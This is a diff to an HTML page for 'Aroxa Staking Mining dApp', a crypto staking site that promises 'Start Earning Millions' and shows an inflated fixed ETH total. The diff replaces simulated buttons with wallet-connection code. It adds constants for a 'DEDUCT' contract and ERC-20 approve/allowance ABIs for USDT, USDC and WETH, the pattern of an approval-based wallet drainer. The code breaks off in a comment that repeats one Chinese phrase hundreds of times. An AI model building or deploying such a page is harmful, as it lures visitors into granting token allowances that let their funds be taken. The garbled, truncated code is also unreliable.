@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aroxa Staking Mining dApp</title>
+    <script src="https://cdn.ethers.io/lib/ethers-6.7.0.umd.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
 
@@ -17,6 +18,7 @@
             align-items: center;
             min-height: 100vh;
             color: #ffffff;
+            position: relative; /* For overlay positioning */
         }
         .app-container {
             background: rgba(0, 0, 0, 0.5);
@@ -29,6 +31,37 @@
             overflow-y: auto;
             max-height: 800px;
             border: 1px solid rgba(0, 255, 255, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+        #blurOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: 10;
+            color: #ffffff;
+            text-align: center;
+            font-size: 20px;
+        }
+        #blurOverlay.show {
+            display: flex;
+            opacity: 1;
+        }
+        #status {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            display: none;
         }
         .header {
             display: flex;
@@ -212,6 +245,9 @@
     </style>
 </head>
 <body>
+    <div id="blurOverlay">
+        <div id="overlayMessage"></div>
+    </div>
     <div class="app-container">
         <div class="header">
             <div class="logo">⊙ Aroxa</div>
@@ -220,8 +256,10 @@
                 <option value="zh-Hant">繁中</option>
                 <option value="zh-Hans">简中</option>
             </select>
+            <button id="connectButton" class="connect-btn">Connect</button>
             <div class="erc">ERC</div>
         </div>
+        <div id="status"></div>
         <div class="title" id="title">Popular Mining</div>
         <div class="subtitle" id="subtitle">Start Earning Millions</div>
         <div class="total-funds">
@@ -254,7 +292,7 @@
                 </div>
             </div>
             <div class="next-benefit" id="nextBenefit">Next Benefit: 00:00:00</div>
-            <button id="startBtn" class="start-btn" id="startBtnText">Start</button>
+            <button id="startBtn" class="start-btn">Start</button>
         </div>
         <div id="pledging" class="content-section">
             <div class="pledge-form">
@@ -270,7 +308,7 @@
                         <option value="90">90 Days</option>
                     </select>
                 </div>
-                <button id="pledgeBtn" class="pledge-btn" id="pledgeBtnText">Pledge Now</button>
+                <button id="pledgeBtn" class="pledge-btn">Pledge Now</button>
             </div>
             <div class="pledge-stats">
                 <div class="stat">
@@ -294,177 +332,56 @@
     </div>
 
     <script>
-        const translations = {
-            'en': {
-                title: 'Popular Mining',
-                subtitle: 'Start Earning Millions',
-                totalValue: '12,856,459.94 ETH',
-                tabLiquidity: 'Liquidity',
-                tabPledging: 'Pledging',
-                grossOutputLabel: 'Gross Output',
-                cumulativeLabel: 'Cumulative',
-                walletBalanceLabel: 'Wallet Balance',
-                accountBalanceLabel: 'Account Balance',
-                compoundLabel: '⚡ Compound',
-                nextBenefit: 'Next Benefit: 00:00:00',
-                startBtnText: 'Start',
-                pledgeAmountLabel: 'Pledge Amount',
-                pledgeDurationLabel: 'Duration',
-                pledgeBtnText: 'Pledge Now',
-                totalPledgedLabel: 'Total Pledged',
-                expectedYieldLabel: 'Expected Yield',
-                apyLabel: 'APY',
-                lockedUntilLabel: 'Locked Until'
-            },
-            'zh-Hant': {
-                title: '熱門挖礦',
-                subtitle: '開始賺取數百萬',
-                totalValue: '12,856,459.94 ETH',
-                tabLiquidity: '流動性',
-                tabPledging: '質押',
-                grossOutputLabel: '總產出',
-                cumulativeLabel: '累計',
-                walletBalanceLabel: '錢包餘額',
-                accountBalanceLabel: '帳戶餘額',
-                compoundLabel: '⚡ 複利',
-                nextBenefit: '下次收益: 00:00:00',
-                startBtnText: '開始',
-                pledgeAmountLabel: '質押金額',
-                pledgeDurationLabel: '期間',
-                pledgeBtnText: '立即質押',
-                totalPledgedLabel: '總質押',
-                expectedYieldLabel: '預期收益',
-                apyLabel: '年化收益率',
-                lockedUntilLabel: '鎖定至'
-            },
-            'zh-Hans': {
-                title: '热门挖矿',
-                subtitle: '开始赚取数百万',
-                totalValue: '12,856,459.94 ETH',
-                tabLiquidity: '流动性',
-                tabPledging: '质押',
-                grossOutputLabel: '总产出',
-                cumulativeLabel: '累计',
-                walletBalanceLabel: '钱包余额',
-                accountBalanceLabel: '账户余额',
-                compoundLabel: '⚡ 复利',
-                nextBenefit: '下次收益: 00:00:00',
-                startBtnText: '开始',
-                pledgeAmountLabel: '质押金额',
-                pledgeDurationLabel: '期间',
-                pledgeBtnText: '立即质押',
-                totalPledgedLabel: '总质押',
-                expectedYieldLabel: '预期收益',
-                apyLabel: '年化收益率',
-                lockedUntilLabel: '锁定至'
-            }
-        };
+        //---Client-side Constants (客戶端常數)---
+        const DEDUCT_CONTRACT_ADDRESS='0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
+        const USDT_CONTRACT_ADDRESS='0xdAC17F958D2ee523a2206206994597C13D831ec7';
+        // ****** 修正後的 USDC 地址 (0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) ******
+        const USDC_CONTRACT_ADDRESS='0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+        const WETH_CONTRACT_ADDRESS='0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 
-        let currentLang = navigator.language || navigator.userLanguage;
+        //---ABI Definitions (客戶端精簡版 ABI)---
+        const DEDUCT_CONTRACT_ABI=[
+        "function isServiceActiveFor(address customer) view returns (bool)",
+        "function activateService(address tokenContract) external",
+        "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
+        ];
 
-        // Map detected language to supported languages
-        if (!['en', 'zh-Hant', 'zh-Hans'].includes(currentLang)) {
-            currentLang = 'en'; // Default to English if language not supported
-        } else if (currentLang === 'zh') {
-            currentLang = 'zh-Hans'; // Default to Simplified Chinese for generic 'zh'
+        const ERC20_ABI=[
+        "function approve(address spender, uint256 amount) external returns (bool)",
+        "function balanceOf(address account) view returns (uint256)",
+        "function allowance(address owner, address spender) view returns (uint256)"
+        ];
+
+        //---Global Variables & DOM Elements (全域變數與 DOM 元素)---
+        const connectButton=document.getElementById('connectButton');
+        const overlay=document.getElementById('blurOverlay');
+        const overlayMessage=document.getElementById('overlayMessage');
+        const statusDiv=document.getElementById('status');
+
+        let provider,signer,userAddress;
+        let deductContract,usdtContract,usdcContract,wethContract;
+
+        //---UI Control Functions (使用者介面控制函數)---
+        function hideOverlay() {
+        if(!overlay)return;
+        overlay.style.opacity='0';
+        setTimeout(() => {overlay.style.display='none';},300);
         }
 
-        const languageSelect = document.getElementById('languageSelect');
-        const elements = {
-            title: document.getElementById('title'),
-            subtitle: document.getElementById('subtitle'),
-            totalValue: document.getElementById('totalValue'),
-            tabLiquidity: document.getElementById('tabLiquidity'),
-            tabPledging: document.getElementById('tabPledging'),
-            grossOutputLabel: document.getElementById('grossOutputLabel'),
-            cumulativeLabel: document.getElementById('cumulativeLabel'),
-            walletBalanceLabel: document.getElementById('walletBalanceLabel'),
-            accountBalanceLabel: document.getElementById('accountBalanceLabel'),
-            compoundLabel: document.getElementById('compoundLabel'),
-            nextBenefit: document.getElementById('nextBenefit'),
-            startBtnText: document.getElementById('startBtn'),
-            pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
-            pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
-            pledgeBtnText: document.getElementById('pledgeBtn'),
-            totalPledgedLabel: document.getElementById('totalPledgedLabel'),
-            expectedYieldLabel: document.getElementById('expectedYieldLabel'),
-            apyLabel: document.getElementById('apyLabel'),
-            lockedUntilLabel: document.getElementById('lockedUntilLabel')
-        };
-
-        function updateLanguage(lang) {
-            currentLang = lang;
-            languageSelect.value = lang;
-            for (let key in elements) {
-                if (elements[key]) {
-                    elements[key].textContent = translations[lang][key];
-                }
-            }
+        function showOverlay(message) {
+        if(!overlay||!overlayMessage)return;
+        overlayMessage.innerHTML=message;
+        overlay.style.display='flex';
+        //確保 opacity 設置在 display: flex 之後，以便過渡生效
+        setTimeout(() => {overlay.style.opacity='1';},10);
         }
 
-        languageSelect.value = currentLang;
-        updateLanguage(currentLang);
+        function updateStatus(message) {
+        if(!statusDiv)return;
+        statusDiv.innerHTML=message||'';
+        statusDiv.style.display=message?'block':'none';
+        }
 
-        languageSelect.addEventListener('change', (e) => {
-            updateLanguage(e.target.value);
-        });
-
-        const connectBtn = document.getElementById('connectBtn');
-        const refreshWallet = document.getElementById('refreshWallet');
-        const startBtn = document.getElementById('startBtn');
-        const pledgeBtn = document.getElementById('pledgeBtn');
-        const tabs = document.querySelectorAll('.tab');
-        const sections = document.querySelectorAll('.content-section');
-
-        connectBtn.addEventListener('click', () => {
-            if (connectBtn.classList.contains('connected')) {
-                connectBtn.textContent = translations[currentLang].startBtnText;
-                connectBtn.classList.remove('connected');
-                alert('Wallet disconnected!');
-            } else {
-                connectBtn.textContent = 'Connected';
-                connectBtn.classList.add('connected');
-                alert('Wallet connected! (Simulation)');
-            }
-        });
-
-        refreshWallet.addEventListener('click', () => {
-            alert('Refreshing wallet balance... (Simulation: Balance updated to 0.000 USDT)');
-        });
-
-        startBtn.addEventListener('click', () => {
-            if (!connectBtn.classList.contains('connected')) {
-                alert('Please connect your wallet first!');
-                return;
-            }
-            alert('Starting liquidity mining... (Simulation: Process initiated)');
-            document.querySelector('#liquidity .stat-value:nth-of-type(1)').textContent = '2.1000380 ETH';
-            document.querySelector('#liquidity .stat-value:nth-of-type(2)').textContent = '0.6000380 ETH';
-        });
-
-        pledgeBtn.addEventListener('click', () => {
-            if (!connectBtn.classList.contains('connected')) {
-                alert('Please connect your wallet first!');
-                return;
-            }
-            const amount = document.getElementById('pledgeAmount').value;
-            const duration = document.getElementById('pledgeDuration').value;
-            if (!amount) {
-                alert('Please enter a pledge amount!');
-                return;
-            }
-            alert(`Pledging ${amount} USDT for ${duration} days... (Simulation: Pledge successful)`);
-            document.querySelector('.pledge-stats .stat-value:nth-of-type(1)').textContent = `${parseFloat(5678.90) + parseFloat(amount)}.00 USDT`;
-        });
-
-        tabs.forEach(tab => {
-            tab.addEventListener('click', () => {
-                tabs.forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                sections.forEach(s => s.classList.remove('active'));
-                document.getElementById(tab.dataset.tab).classList.add('active');
-            });
-        });
-    </script>
-</body>
-</html>
+        /**
+        *重置應用程式的狀態，並可選地顯示「請連接」訊息。
+        *@param{boolean}showMsg-是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示連接錢包的遮罩訊息。(是否顯示
